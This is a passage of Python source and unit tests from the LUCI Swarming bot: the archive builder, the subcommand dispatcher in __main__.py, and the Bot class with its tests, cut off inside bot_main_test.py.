('/swarming/api/v1/bot/bot_code/<version:[0-9a-f]{40}>', BotCodeHandler),\n      ('/swarming/api/v1/bot/event', BotEventHandler),\n      ('/swarming/api/v1/bot/handshake', BotHandshakeHandler),\n      ('/swarming/api/v1/bot/poll', BotPollHandler),\n      ('/swarming/api/v1/bot/server_ping', ServerPingHandler),\n      ('/swarming/api/v1/bot/task_update', BotTaskUpdateHandler),\n      ('/swarming/api/v1/bot/task_update/<task_id:[a-f0-9]+>',\n          BotTaskUpdateHandler),\n      ('/swarming/api/v1/bot/task_error', BotTaskErrorHandler),\n      ('/swarming/api/v1/bot/task_error/<task_id:[a-f0-9]+>',\n          BotTaskErrorHandler),\n  ]\n  return [webapp2.Route(*i) for i in routes]\n/n/n/n/appengine/swarming/server/bot_archive.py/n/n# Copyright 2014 The LUCI Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\n\"\"\"Generates the swarming_bot.zip archive for the bot.\n\nUnlike the other source files, this file can be run from ../tools/bot_archive.py\nstand-alone to generate a swarming_bot.zip for local testing so it doesn't\nimport anything from the AppEngine SDK.\n\nThe hash of the content of the files in the archive is used to define the\ncurrent version of the swarming bot code.\n\"\"\"\n\nimport hashlib\nimport json\nimport logging\nimport os\nimport StringIO\nimport zipfile\n\n\n# List of files needed by the swarming bot.\n# TODO(maruel): Make the list automatically generated?\nFILES = (\n    '__main__.py',\n    'api/__init__.py',\n    'api/bot.py',\n    'api/parallel.py',\n    'api/os_utilities.py',\n    'api/platforms/__init__.py',\n    'api/platforms/android.py',\n    'api/platforms/common.py',\n    'api/platforms/gce.py',\n    'api/platforms/linux.py',\n    'api/platforms/osx.py',\n    'api/platforms/posix.py',\n    'api/platforms/win.py',\n    'bot_code/__init__.py',\n    'bot_code/bot_main.py',\n    'bot_code/common.py',\n    'bot_code/singleton.py',\n    'bot_code/task_runner.py',\n    'bot_code/xsrf_client.py',\n    'client/auth.py',\n    'client/isolated_format.py',\n    'client/isolateserver.py',\n    'client/run_isolated.py',\n    'config/__init__.py',\n    'third_party/__init__.py',\n    'third_party/colorama/__init__.py',\n    'third_party/colorama/ansi.py',\n    'third_party/colorama/ansitowin32.py',\n    'third_party/colorama/initialise.py',\n    'third_party/colorama/win32.py',\n    'third_party/colorama/winterm.py',\n    'third_party/depot_tools/__init__.py',\n    'third_party/depot_tools/fix_encoding.py',\n    'third_party/depot_tools/subcommand.py',\n    'third_party/httplib2/__init__.py',\n    'third_party/httplib2/cacerts.txt',\n    'third_party/httplib2/iri2uri.py',\n    'third_party/httplib2/socks.py',\n    'third_party/oauth2client/__init__.py',\n    'third_party/oauth2client/_helpers.py',\n    'third_party/oauth2client/_openssl_crypt.py',\n    'third_party/oauth2client/_pycrypto_crypt.py',\n    'third_party/oauth2client/client.py',\n    'third_party/oauth2client/clientsecrets.py',\n    'third_party/oauth2client/crypt.py',\n    'third_party/oauth2client/file.py',\n    'third_party/oauth2client/gce.py',\n    'third_party/oauth2client/keyring_storage.py',\n    'third_party/oauth2client/locked_file.py',\n    'third_party/oauth2client/multistore_file.py',\n    'third_party/oauth2client/service_account.py',\n    'third_party/oauth2client/tools.py',\n    'third_party/oauth2client/util.py',\n    'third_party/oauth2client/xsrfutil.py',\n    'third_party/pyasn1/pyasn1/__init__.py',\n    'third_party/pyasn1/pyasn1/codec/__init__.py',\n    'third_party/pyasn1/pyasn1/codec/ber/__init__.py',\n    'third_party/pyasn1/pyasn1/codec/ber/decoder.py',\n    'third_party/pyasn1/pyasn1/codec/ber/encoder.py',\n    'third_party/pyasn1/pyasn1/codec/ber/eoo.py',\n    'third_party/pyasn1/pyasn1/codec/cer/__init__.py',\n    'third_party/pyasn1/pyasn1/codec/cer/decoder.py',\n    'third_party/pyasn1/pyasn1/codec/cer/encoder.py',\n    'third_party/pyasn1/pyasn1/codec/der/__init__.py',\n    'third_party/pyasn1/pyasn1/codec/der/decoder.py',\n    'third_party/pyasn1/pyasn1/codec/der/encoder.py',\n    'third_party/pyasn1/pyasn1/compat/__init__.py',\n    'third_party/pyasn1/pyasn1/compat/binary.py',\n    'third_party/pyasn1/pyasn1/compat/octets.py',\n    'third_party/pyasn1/pyasn1/debug.py',\n    'third_party/pyasn1/pyasn1/error.py',\n    'third_party/pyasn1/pyasn1/type/__init__.py',\n    'third_party/pyasn1/pyasn1/type/base.py',\n    'third_party/pyasn1/pyasn1/type/char.py',\n    'third_party/pyasn1/pyasn1/type/constraint.py',\n    'third_party/pyasn1/pyasn1/type/error.py',\n    'third_party/pyasn1/pyasn1/type/namedtype.py',\n    'third_party/pyasn1/pyasn1/type/namedval.py',\n    'third_party/pyasn1/pyasn1/type/tag.py',\n    'third_party/pyasn1/pyasn1/type/tagmap.py',\n    'third_party/pyasn1/pyasn1/type/univ.py',\n    'third_party/pyasn1/pyasn1/type/useful.py',\n    'third_party/requests/__init__.py',\n    'third_party/requests/adapters.py',\n    'third_party/requests/api.py',\n    'third_party/requests/auth.py',\n    'third_party/requests/certs.py',\n    'third_party/requests/compat.py',\n    'third_party/requests/cookies.py',\n    'third_party/requests/exceptions.py',\n    'third_party/requests/hooks.py',\n    'third_party/requests/models.py',\n    'third_party/requests/packages/__init__.py',\n    'third_party/requests/packages/urllib3/__init__.py',\n    'third_party/requests/packages/urllib3/_collections.py',\n    'third_party/requests/packages/urllib3/connection.py',\n    'third_party/requests/packages/urllib3/connectionpool.py',\n    'third_party/requests/packages/urllib3/contrib/__init__.py',\n    'third_party/requests/packages/urllib3/contrib/ntlmpool.py',\n    'third_party/requests/packages/urllib3/contrib/pyopenssl.py',\n    'third_party/requests/packages/urllib3/exceptions.py',\n    'third_party/requests/packages/urllib3/fields.py',\n    'third_party/requests/packages/urllib3/filepost.py',\n    'third_party/requests/packages/urllib3/packages/__init__.py',\n    'third_party/requests/packages/urllib3/packages/ordered_dict.py',\n    'third_party/requests/packages/urllib3/packages/six.py',\n    'third_party/requests/packages/urllib3/packages/ssl_match_hostname/'\n        '__init__.py',\n    'third_party/requests/packages/urllib3/packages/ssl_match_hostname/'\n        '_implementation.py',\n    'third_party/requests/packages/urllib3/poolmanager.py',\n    'third_party/requests/packages/urllib3/request.py',\n    'third_party/requests/packages/urllib3/response.py',\n    'third_party/requests/packages/urllib3/util/__init__.py',\n    'third_party/requests/packages/urllib3/util/connection.py',\n    'third_party/requests/packages/urllib3/util/request.py',\n    'third_party/requests/packages/urllib3/util/response.py',\n    'third_party/requests/packages/urllib3/util/retry.py',\n    'third_party/requests/packages/urllib3/util/ssl_.py',\n    'third_party/requests/packages/urllib3/util/timeout.py',\n    'third_party/requests/packages/urllib3/util/url.py',\n    'third_party/requests/sessions.py',\n    'third_party/requests/status_codes.py',\n    'third_party/requests/structures.py',\n    'third_party/requests/utils.py',\n    'third_party/rsa/rsa/__init__.py',\n    'third_party/rsa/rsa/_compat.py',\n    'third_party/rsa/rsa/_version133.py',\n    'third_party/rsa/rsa/_version200.py',\n    'third_party/rsa/rsa/asn1.py',\n    'third_party/rsa/rsa/bigfile.py',\n    'third_party/rsa/rsa/cli.py',\n    'third_party/rsa/rsa/common.py',\n    'third_party/rsa/rsa/core.py',\n    'third_party/rsa/rsa/key.py',\n    'third_party/rsa/rsa/parallel.py',\n    'third_party/rsa/rsa/pem.py',\n    'third_party/rsa/rsa/pkcs1.py',\n    'third_party/rsa/rsa/prime.py',\n    'third_party/rsa/rsa/randnum.py',\n    'third_party/rsa/rsa/transform.py',\n    'third_party/rsa/rsa/util.py',\n    'third_party/rsa/rsa/varblock.py',\n    'third_party/six/__init__.py',\n    'utils/__init__.py',\n    'utils/cacert.pem',\n    'utils/file_path.py',\n    'utils/fs.py',\n    'utils/large.py',\n    'utils/logging_utils.py',\n    'utils/lru.py',\n    'utils/net.py',\n    'utils/oauth.py',\n    'utils/on_error.py',\n    'utils/subprocess42.py',\n    'utils/threading_utils.py',\n    'utils/tools.py',\n    'utils/zip_package.py',\n    'adb/__init__.py',\n    'adb/adb_commands.py',\n    'adb/adb_protocol.py',\n    'adb/common.py',\n    'adb/contrib/__init__.py',\n    'adb/contrib/adb_commands_safe.py',\n    'adb/contrib/high.py',\n    'adb/contrib/parallel.py',\n    'adb/fastboot.py',\n    'adb/filesync_protocol.py',\n    'adb/sign_pythonrsa.py',\n    'adb/usb_exceptions.py',\n    'python_libusb1/__init__.py',\n    'python_libusb1/libusb1.py',\n    'python_libusb1/usb1.py',\n)\n\n\ndef is_windows():\n  \"\"\"Returns True if this code is running under Windows.\"\"\"\n  return os.__file__[0] != '/'\n\n\ndef resolve_symlink(path):\n  \"\"\"Processes path containing symlink on Windows.\n\n  This is needed to make ../swarming_bot/main_test.py pass on Windows because\n  git on Windows renders symlinks as normal files.\n  \"\"\"\n  if not is_windows():\n    # Only does this dance on Windows.\n    return path\n  parts = os.path.normpath(path).split(os.path.sep)\n  for i in xrange(2, len(parts)):\n    partial = os.path.sep.join(parts[:i])\n    if os.path.isfile(partial):\n      with open(partial) as f:\n        link = f.read()\n      assert '\\n' not in link and link, link\n      parts[i-1] = link\n  return os.path.normpath(os.path.sep.join(parts))\n\n\ndef yield_swarming_bot_files(root_dir, host, host_version, additionals):\n  \"\"\"Yields all the files to map as tuple(filename, content).\n\n  config.json is injected with json data about the server.\n\n  This function guarantees that the output is sorted by filename.\n  \"\"\"\n  items = {i: None for i in FILES}\n  items.update(additionals)\n  config = {\n    'server': host.rstrip('/'),\n    'server_version': host_version,\n  }\n  items['config/config.json'] = json.dumps(config)\n  for item, content in sorted(items.iteritems()):\n    if content is not None:\n      yield item, content\n    else:\n      with open(resolve_symlink(os.path.join(root_dir, item)), 'rb') as f:\n        yield item, f.read()\n\n\ndef get_swarming_bot_zip(root_dir, host, host_version, additionals):\n  \"\"\"Returns a zipped file of all the files a bot needs to run.\n\n  Arguments:\n    root_dir: directory swarming_bot.\n    additionals: dict(filepath: content) of additional items to put into the zip\n        file, in addition to FILES and MAPPED. In practice, it's going to be a\n        custom bot_config.py.\n  Returns:\n    Tuple(str being the zipped file's content, bot version (SHA-1) it\n    represents).\n  \"\"\"\n  zip_memory_file = StringIO.StringIO()\n  h = hashlib.sha1()\n  with zipfile.ZipFile(zip_memory_file, 'w', zipfile.ZIP_DEFLATED) as zip_file:\n    for name, content in yield_swarming_bot_files(\n        root_dir, host, host_version, additionals):\n      zip_file.writestr(name, content)\n      h.update(str(len(name)))\n      h.update(name)\n      h.update(str(len(content)))\n      h.update(content)\n\n  data = zip_memory_file.getvalue()\n  bot_version = h.hexdigest()\n  logging.info(\n      'get_swarming_bot_zip(%s) is %d bytes; %s',\n      additionals.keys(), len(data), bot_version)\n  return data, bot_version\n\n\ndef get_swarming_bot_version(root_dir, host, host_version, additionals):\n  \"\"\"Returns the SHA1 hash of the bot code, representing the version.\n\n  Arguments:\n    root_dir: directory swarming_bot.\n    additionals: See get_swarming_bot_zip's doc.\n\n  Returns:\n    The SHA1 hash of the bot code.\n  \"\"\"\n  h = hashlib.sha1()\n  try:\n    # TODO(maruel): Deduplicate from zip_package.genereate_version().\n    for name, content in yield_swarming_bot_files(\n        root_dir, host, host_version, additionals):\n      h.update(str(len(name)))\n      h.update(name)\n      h.update(str(len(content)))\n      h.update(content)\n  except IOError:\n    logging.warning('Missing expected file. Hash will be invalid.')\n  bot_version = h.hexdigest()\n  logging.info(\n      'get_swarming_bot_version(%s) = %s', sorted(additionals), bot_version)\n  return bot_version\n/n/n/n/appengine/swarming/swarming_bot/__main__.py/n/n# Copyright 2014 The LUCI Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\n\"\"\"Runs either task_runner.py, bot_main.py or bot_config.py.\n\nThe imports are done late so if an ImportError occurs, it is localized to this\ncommand only.\n\"\"\"\n\nimport code\nimport json\nimport logging\nimport os\nimport optparse\nimport shutil\nimport sys\nimport zipfile\n\nfrom bot_code import common\n\n# That's from ../../../client/\nfrom third_party.depot_tools import fix_encoding\nfrom utils import logging_utils\nfrom utils import zip_package\n\n# This file can only be run as a zip.\nTHIS_FILE = os.path.abspath(zip_package.get_main_script_path())\n\n\n# libusb1 expects to be directly in sys.path.\nsys.path.insert(0, os.path.join(THIS_FILE, 'python_libusb1'))\n\n\n# TODO(maruel): Use depot_tools/subcommand.py. The goal here is to have all the\n# sub commands packed into the single .zip file as a swiss army knife (think\n# busybox but worse).\n\n\ndef CMDattributes(_args):\n  \"\"\"Prints out the bot's attributes.\"\"\"\n  from bot_code import bot_main\n  json.dump(\n      bot_main.get_attributes(bot_main.get_bot()), sys.stdout, indent=2,\n      sort_keys=True, separators=(',', ': '))\n  print('')\n  return 0\n\n\ndef CMDconfig(_args):\n  \"\"\"Prints the config.json embedded in this zip.\"\"\"\n  logging_utils.prepare_logging(None)\n  from bot_code import bot_main\n  json.dump(bot_main.get_config(), sys.stdout, indent=2, sort_keys=True)\n  print('')\n  return 0\n\n\ndef CMDis_fine(_args):\n  \"\"\"Just reports that the code doesn't throw.\n\n  That ensures that the bot has minimal viability before transfering control to\n  it. For now, it just imports bot_main but later it'll check the config, etc.\n  \"\"\"\n  # pylint: disable=unused-variable\n  from bot_code import bot_main\n  from config import bot_config\n  # We're #goodenough.\n  return 0\n\n\ndef CMDrestart(_args):\n  \"\"\"Utility subcommand that hides the difference between each OS to reboot\n  the host.\"\"\"\n  logging_utils.prepare_logging(None)\n  import os_utilities\n  # This function doesn't return.\n  os_utilities.restart()\n  # Should never reach here.\n  return 1\n\n\ndef CMDrun_isolated(args):\n  \"\"\"Internal command to run an isolated command.\"\"\"\n  sys.path.insert(0, os.path.join(THIS_FILE, 'client'))\n  # run_isolated setups logging by itself.\n  import run_isolated\n  return run_isolated.main(args)\n\n\ndef CMDsetup(_args):\n  \"\"\"Setup the bot to auto-start but doesn't start the bot.\"\"\"\n  logging_utils.prepare_logging(os.path.join('logs', 'bot_config.log'))\n  from bot_code import bot_main\n  bot_main.setup_bot(True)\n  return 0\n\n\ndef CMDserver(_args):\n  \"\"\"Prints the server url. It's like 'config' but easier to parse.\"\"\"\n  logging_utils.prepare_logging(None)\n  from bot_code import bot_main\n  print bot_main.get_config()['server']\n  return 0\n\n\ndef CMDshell(args):\n  \"\"\"Starts a shell with api.* in..\"\"\"\n  logging_utils.prepare_logging(None)\n  logging_utils.set_console_level(logging.DEBUG)\n\n  from bot_code import bot_main\n  from api import os_utilities\n  from api import platforms\n  local_vars = {\n    'bot_main': bot_main,\n    'json': json,\n    'os_utilities': os_utilities,\n    'platforms': platforms,\n  }\n  # Can't use: from api.platforms import *\n  local_vars.update(\n      (k, v) for k, v in platforms.__dict__.iteritems()\n      if not k.startswith('_'))\n\n  if args:\n    for arg in args:\n      exec code.compile_command(arg) in local_vars\n  else:\n    code.interact(\n        'Locals:\\n  ' + '\\n  '.join( sorted(local_vars)), None, local_vars)\n  return 0\n\n\ndef CMDstart_bot(args):\n  \"\"\"Starts the swarming bot.\"\"\"\n  logging_utils.prepare_logging(os.path.join('logs', 'swarming_bot.log'))\n  logging.info(\n      'importing bot_main: %s, %s', THIS_FILE, zip_package.generate_version())\n  from bot_code import bot_main\n  result = bot_main.main(args)\n  logging.info('bot_main exit code: %d', result)\n  return result\n\n\ndef CMDstart_slave(args):\n  \"\"\"Ill named command that actually sets up the bot then start it.\"\"\"\n  # TODO(maruel): Rename function.\n  logging_utils.prepare_logging(os.path.join('logs', 'bot_config.log'))\n\n  parser = optparse.OptionParser()\n  parser.add_option(\n      '--survive', action='store_true',\n      help='Do not reboot the host even if bot_config.setup_bot() asked to')\n  options, args = parser.parse_args(args)\n\n  try:\n    from bot_code import bot_main\n    bot_main.setup_bot(options.survive)\n  except Exception:\n    logging.exception('bot_main.py failed.')\n\n  logging.info('Starting the bot: %s', THIS_FILE)\n  return common.exec_python([THIS_FILE, 'start_bot'])\n\n\ndef CMDtask_runner(args):\n  \"\"\"Internal command to run a swarming task.\"\"\"\n  logging_utils.prepare_logging(os.path.join('logs', 'task_runner.log'))\n  from bot_code import task_runner\n  return task_runner.main(args)\n\n\ndef CMDversion(_args):\n  \"\"\"Prints the version of this file and the hash of the code.\"\"\"\n  logging_utils.prepare_logging(None)\n  print zip_package.generate_version()\n  return 0\n\n\ndef main():\n  if os.getenv('CHROME_REMOTE_DESKTOP_SESSION') == '1':\n    # Disable itself when run under Google Chrome Remote Desktop, as it's\n    # normally started at the console and starting up via Remote Desktop would\n    # cause multiple bots to run concurrently on the host.\n    print >> sys.stderr, (\n        'Inhibiting Swarming bot under Google Chrome Remote Desktop.')\n    return 0\n\n  # Always make the current working directory the directory containing this\n  # file. It simplifies assumptions.\n  os.chdir(os.path.dirname(THIS_FILE))\n  # Always create the logs dir first thing, before printing anything out.\n  if not os.path.isdir('logs'):\n    os.mkdir('logs')\n\n  # This is necessary so os.path.join() works with unicode path. No kidding.\n  # This must be done here as each of the command take wildly different code\n  # path and this must be run in every case, as it causes really unexpected\n  # issues otherwise, especially in module os.path.\n  fix_encoding.fix_encoding()\n\n  if os.path.basename(THIS_FILE) == 'swarming_bot.zip':\n    # Self-replicate itself right away as swarming_bot.1.zip and restart as it.\n    print >> sys.stderr, 'Self replicating pid:%d.' % os.getpid()\n    if os.path.isfile('swarming_bot.1.zip'):\n      os.remove('swarming_bot.1.zip')\n    shutil.copyfile('swarming_bot.zip', 'swarming_bot.1.zip')\n    cmd = ['swarming_bot.1.zip'] + sys.argv[1:]\n    print >> sys.stderr, 'cmd: %s' % cmd\n    return common.exec_python(cmd)\n\n  # sys.argv[0] is the zip file itself.\n  cmd = 'start_slave'\n  args = []\n  if len(sys.argv) > 1:\n    cmd = sys.argv[1]\n    args = sys.argv[2:]\n\n  fn = getattr(sys.modules[__name__], 'CMD%s' % cmd, None)\n  if fn:\n    try:\n      return fn(args)\n    except ImportError:\n      logging.exception('Failed to run %s', cmd)\n      with zipfile.ZipFile(THIS_FILE, 'r') as f:\n        logging.error('Files in %s:\\n%s', THIS_FILE, f.namelist())\n      return 1\n\n  print >> sys.stderr, 'Unknown command %s' % cmd\n  return 1\n\n\nif __name__ == '__main__':\n  sys.exit(main())\n/n/n/n/appengine/swarming/swarming_bot/api/bot.py/n/n# Copyright 2014 The LUCI Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\n\"\"\"Bot interface used in bot_config.py.\"\"\"\n\nimport logging\nimport os\nimport threading\nimport time\n\nimport os_utilities\nfrom utils import zip_package\n\nTHIS_FILE = os.path.abspath(zip_package.get_main_script_path())\n\n# Method could be a function - pylint: disable=R0201\n\n\nclass Bot(object):\n  def __init__(\n      self, remote, attributes, server, server_version, base_dir,\n      shutdown_hook):\n    # Do not expose attributes nor remote for now, as attributes will be\n    # refactored soon and remote would have a lot of side effects if used by\n    # bot_config.\n    self._attributes = attributes\n    self._base_dir = base_dir\n    self._remote = remote\n    self._server = server\n    self._server_version = server_version\n    self._shutdown_hook = shutdown_hook\n    self._timers = []\n    self._timers_dying = False\n    self._timers_lock = threading.Lock()\n\n  @property\n  def base_dir(self):\n    \"\"\"Returns the working directory.\n\n    It is normally the current workind directory, e.g. os.getcwd() but it is\n    preferable to not assume that.\n    \"\"\"\n    return self._base_dir\n\n  @property\n  def dimensions(self):\n    \"\"\"The bot's current dimensions.\n\n    Dimensions are relatively static and not expected to change much. They\n    should change only when it effectively affects the bot's capacity to execute\n    tasks.\n    \"\"\"\n    return self._attributes.get('dimensions', {}).copy()\n\n  @property\n  def id(self):\n    \"\"\"Returns the bot's ID.\"\"\"\n    return self.dimensions.get('id', ['unknown'])[0]\n\n  @property\n  def remote(self):\n    \"\"\"XsrfClient instance to talk to the server.\n\n    Should not be normally used by bot_config.py for now.\n    \"\"\"\n    return self._remote\n\n  @property\n  def server(self):\n    \"\"\"URL of the swarming server this bot is connected to.\n\n    It includes the https:// prefix but without trailing /, so it looks like\n    \"https://foo-bar.appspot.com\".\n    \"\"\"\n    return self._server\n\n  @property\n  def server_version(self):\n    \"\"\"Version of the server's implementation.\n\n    The form is nnn-hhhhhhh for pristine version and nnn-hhhhhhh-tainted-uuuu\n    for non-upstreamed code base:\n      nnn: revision pseudo number\n      hhhhhhh: git commit hash\n      uuuu: username\n    \"\"\"\n    return self._server_version\n\n  @property\n  def state(self):\n    return self._attributes['state']\n\n  @property\n  def swarming_bot_zip(self):\n    \"\"\"Absolute path to the swarming_bot.zip file.\n\n    The bot itself is run as swarming_bot.1.zip or swarming_bot.2.zip. Always\n    return swarming_bot.zip since this is the script that must be used when\n    starting up.\n    \"\"\"\n    return os.path.join(os.path.dirname(THIS_FILE), 'swarming_bot.zip')\n\n  def post_event(self, event_type, message):\n    \"\"\"Posts an event to the server.\"\"\"\n    data = self._attributes.copy()\n    data['event'] = event_type\n    data['message'] = message\n    self._remote.url_read_json('/swarming/api/v1/bot/event', data=data)\n\n  def post_error(self, message):\n    \"\"\"Posts given string as a failure.\n\n    This is used in case of internal code error. It traps exception.\n    \"\"\"\n    logging.error('Error: %s\\n%s', self._attributes, message)\n    try:\n      self.post_event('bot_error', message)\n    except Exception:\n      logging.exception('post_error(%s) failed.', message)\n\n  def restart(self, message):\n    \"\"\"Reboots the machine.\n\n    If the reboot is successful, never returns: the process should just be\n    killed by OS.\n\n    If reboot fails, logs the error to the server and moves the bot to\n    quarantined mode.\n    \"\"\"\n    self.post_event('bot_rebooting', message)\n    self.cancel_all_timers()\n    if self._shutdown_hook:\n      try:\n        self._shutdown_hook(self)\n      except Exception as e:\n        logging.exception('shutdown hook failed: %s', e)\n    # os_utilities.restart should never return, unless restart is not happening.\n    # If restart is taking longer than N minutes, it probably not going to\n    # finish at all. Report this to the server.\n    try:\n      os_utilities.restart(message, timeout=15*60)\n    except LookupError:\n      # This is a special case where OSX is deeply hosed. In that case the disk\n      # is likely in read-only mode and there isn't much that can be done. This\n      # exception is deep inside pickle.py. So notify the server then hang in\n      # there.\n      self.post_error('This host partition is bad; please fix the host')\n      while True:\n        time.sleep(1)\n    self.post_error('Bot is stuck restarting for: %s' % message)\n\n  def call_later(self, delay_sec, callback):\n    \"\"\"Schedules a function to be called later (if bot is still running).\n\n    All calls are executed in a separate internal thread, be careful with what\n    you call from there (Bot object is generally not thread safe).\n\n    Multiple callbacks can be executed concurrently. It is safe to call\n    'call_later' from the callback.\n    \"\"\"\n    timer = None\n\n    def call_wrapper():\n      with self._timers_lock:\n        # Canceled already?\n        if timer not in self._timers:\n          return\n        self._timers.remove(timer)\n      try:\n        callback()\n      except Exception:\n        logging.exception('Timer callback failed')\n\n    with self._timers_lock:\n      if not self._timers_dying:\n        timer = threading.Timer(delay_sec, call_wrapper)\n        self._timers.append(timer)\n        timer.daemon = True\n        timer.start()\n\n  def cancel_all_timers(self):\n    \"\"\"Cancels all pending 'call_later' calls and forbids adding new ones.\"\"\"\n    timers = None\n    with self._timers_lock:\n      self._timers_dying = True\n      for t in self._timers:\n        t.cancel()\n      timers, self._timers = self._timers, []\n    for t in timers:\n      t.join(timeout=5)\n      if t.isAlive():\n        logging.error('Timer thread did not terminate fast enough: %s', t)\n\n  def update_dimensions(self, new_dimensions):\n    \"\"\"Called internally to update Bot.dimensions.\"\"\"\n    self._attributes['dimensions'] = new_dimensions\n\n  def update_state(self, new_state):\n    \"\"\"Called internally to update Bot.state.\"\"\"\n    self._attributes['state'] = new_state\n/n/n/n/appengine/swarming/swarming_bot/api/bot_test.py/n/n#!/usr/bin/env python\n# Copyright 2014 The LUCI Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\nimport os\nimport sys\nimport unittest\nimport threading\n\nTHIS_FILE = os.path.abspath(__file__)\n\nimport test_env_api\ntest_env_api.setup_test_env()\n\nimport bot\n\n\nclass TestBot(unittest.TestCase):\n  def test_bot(self):\n    obj = bot.Bot(\n        None,\n        {'dimensions': {'foo': 'bar'}},\n        'https://localhost:1/',\n        '1234-1a2b3c4-tainted-joe',\n        'base_dir',\n        None)\n    self.assertEqual({'foo': 'bar'}, obj.dimensions)\n    self.assertEqual(\n        os.path.join(os.path.dirname(THIS_FILE), 'swarming_bot.zip'),\n        obj.swarming_bot_zip)\n    self.assertEqual('1234-1a2b3c4-tainted-joe', obj.server_version)\n    self.assertEqual('base_dir', obj.base_dir)\n\n  def test_bot_call_later(self):\n    obj = bot.Bot(None, {}, 'https://localhost:1/', '1234-1a2b3c4-tainted-joe',\n                  'base_dir', None)\n    ev = threading.Event()\n    obj.call_later(0.001, ev.set)\n    self.assertTrue(ev.wait(1))\n\n  def test_bot_call_later_cancel(self):\n    obj = bot.Bot(None, {}, 'https://localhost:1/', '1234-1a2b3c4-tainted-joe',\n                  'base_dir', None)\n    ev = threading.Event()\n    obj.call_later(0.1, ev.set)\n    obj.cancel_all_timers()\n    self.assertFalse(ev.wait(0.3))\n\n\nif __name__ == '__main__':\n  if '-v' in sys.argv:\n    unittest.TestCase.maxDiff = None\n  unittest.main()\n/n/n/n/appengine/swarming/swarming_bot/bot_code/bot_main_test.py/n/n#!/usr/bin/env python\n# Copyright 2013 The LUCI Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\nimport json\nimport logging\nimport os\nimport shutil\nimport sys\nimport tempfile\nimport threading\nimport time\nimport unittest\nimport zipfile\n\nimport test_env_bot_code\ntest_env_bot_code.setup_test_env()\n\n# Creates a server mock for functions in net.py.\nimport net_utils\n\nimport bot_main\nimport xsrf_client\nfrom api import bot\nfrom api import os_utilities\nfrom depot_tools import fix_encoding\nfrom utils import file_path\nfrom utils import logging_utils\nfrom utils import net\nfrom utils import subprocess42\nfrom utils import zip_package\n\n\n# Access to a protected member XX of a client class - pylint: disable=W0212\n\n\nclass TestBotMain(net_utils.TestCase):\n  maxDiff = 2000\n\n  def setUp(self):\n    super(TestBotMain, self).setUp()\n    os.environ.pop('SWARMING_LOAD_TEST', None)\n    self.root_dir = tempfile.mkdtemp(prefix='bot_main')\n    self.old_cwd = os.getcwd()\n    os.chdir(self.root_dir)\n    # __main__ does it for us.\n    os.mkdir('logs')\n    self.server = xsrf_client.XsrfRemote('https://localhost:1/')\n    self.attributes = {\n      'dimensions': {\n        'foo': ['bar'],\n        'id': ['localhost'],\n        'pool': ['default'],\n      },\n      'state': {\n        'cost_usd_hour': 3600.,\n      },\n      'version': '123',\n    }\n    self.mock(zip_package, 'generate_version', lambda: '123')\n    self.bot = bot.Bot(\n        self.server, self.attributes, 'https://localhost:1/', 'version1',\n        self.root_dir, self.fail)\n    self.mock(self.bot, 'post_error', self.fail)\n    self.mock(self.bot, 'restart', self.fail)\n    self.mock(subprocess42, 'call', self.fail)\n    self.mock(time, 'time', lambda: 100.)\n    config_path = os.path.join(\n        test_env_bot_code.BOT_DIR, 'config', 'config.json')\n    with open(config_path, 'rb') as f:\n      config = json.load(f)\n    self.mock(bot_main, 'get_config', lambda: config)\n    self.mock(\n        bot_main, 'THIS_FILE',\n        os.path.join(test_env_bot_code.BOT_DIR, 'swarming_bot.zip'))\n\n  def tearDown(self):\n    os.environ.pop('SWARMING_BOT_ID', None)\n    os.chdir(self.old_cwd)\n    file_path.rmtree(self.root_dir)\n    super(TestBotMain, self).tearDown()\n\n  def test_get_dimensions(self):\n    dimensions = set(bot_main.get_dimensions(None))\n    dimensions.discard('hidpi')\n    dimensions.discard('zone')  # Only set on GCE bots.\n    expected = {'cores', 'cpu', 'gpu', 'id', 'machine_type', 'os', 'pool'}\n    self.assertEqual(expected, dimensions)\n\n  def test_get_dimensions_load_test(self):\n    os.environ['SWARMING_LOAD_TEST'] = '1'\n    self.assertEqual(['id', 'load_test'], sorted(bot_main.get_dimensions(None)))\n\n  def test_generate_version(self):\n    self.assertEqual('123', bot_main.generate_version())\n\n  def test_get_state(self):\n    self.mock(time, 'time', lambda: 126.0)\n    expected = os_utilities.get_state()\n    expected['sleep_streak'] = 12\n    # During the execution of this test case, the free disk space could have\n    # changed.\n    for disk in expected['disks'].itervalues():\n      self.assertGreater(disk.pop('free_mb'), 1.)\n    actual = bot_main.get_state(None, 12)\n    for disk in actual['disks'].itervalues():\n      self.assertGreater(disk.pop('free_mb'), 1.)\n    self.assertGreater(actual.pop('nb_files_in_temp'), 0)\n    self.assertGreater(expected.pop('nb_files_in_temp'), 0)\n    self.assertGreater(actual.pop('uptime'), 0)\n    self.assertGreater(expected.pop('uptime'), 0)\n    self.assertEqual(sorted(expected.pop('temp', {})),\n                     sorted(actual.pop('temp', {})))\n    self.assertEqual(expected, actual)\n\n  def test_setup_bot(self):\n    self.mock(bot_main, 'get_remote', lambda: self.server)\n    setup_bots = []\n    def setup_bot(_bot):\n      setup_bots.append(1)\n      return False\n    from config import bot_config\n    self.mock(bot_config, 'setup_bot', setup_bot)\n    restarts = []\n    post_event = []\n    self.mock(\n        os_utilities, 'restart', lambda *a, **kw: restarts.append((a, kw)))\n    self.mock(\n        bot.Bot, 'post_event', lambda *a, **kw: post_event.append((a, kw)))\n    self.expected_requests([])\n    bot_main.setup_bot(False)\n    expected = [\n      (('Starting new swarming bot: %s' % bot_main.THIS_FILE,),\n        {'timeout': 900}),\n    ]\n    self.assertEqual(expected, restarts)\n    # It is called twice, one as part of setup_bot(False), another as part of\n    # on_shutdown_hook().\n    self.assertEqual([1, 1], setup_bots)\n    expected = [\n      'Starting new swarming bot: %s' % bot_main.THIS_FILE,\n      'Bot is stuck restarting for: Starting new swarming bot: %s' %\n        bot_main.THIS_FILE,\n    ]\n    self.assertEqual(expected, [i[0][2] for i in post_event])\n\n  def test_post_error_task(self):\n    self.mock(time, 'time', lambda: 126.0)\n    self.mock(logging, 'error', lambda *_, **_kw: None)\n    self.mock(bot_main, 'get_remote', 